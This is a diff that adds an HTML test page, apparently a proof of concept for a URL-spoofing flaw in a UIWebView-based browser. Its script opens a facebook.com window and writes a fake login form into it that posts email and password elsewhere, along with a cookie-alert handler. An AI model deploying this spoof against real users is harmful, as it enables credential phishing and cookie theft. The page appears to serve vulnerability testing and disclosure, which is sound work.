@@ -1,0 +1,25 @@
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <link href='//fonts.googleapis.com/css?family=Roboto' rel='stylesheet' type='text/css'>
+    <title>Facebook URL Spoof</title>
+  <script>
+    function spoof() {
+            w = window.open('https://www.facebook.com:1234/', '_blank');
+  w.document.write('<div onclick=\javascript:alert(document.cookie)\>This Form submits the details to blingtestapp again.(Though URL says facebook.com)</div><form action=/blingtestapp method=post> <input type=email name=email value id=email/><input type=password name=pass id=pass><input type=submit value=LogIn></form>');
+
+    }
+  </script>
+  </head>
+  <body>
+  <style>
+  </style>
+   <h2>Test case: document.write to https://www.facebook.com</h2>
+<p>This test case calls native UIWebView window.open trying to spoof https://www.facebook.com.</p>
+<p class="test"><input type="button" value="Run test case" onclick="spoof();" /></p>
+
+
+
+  </body>
+</html>
+
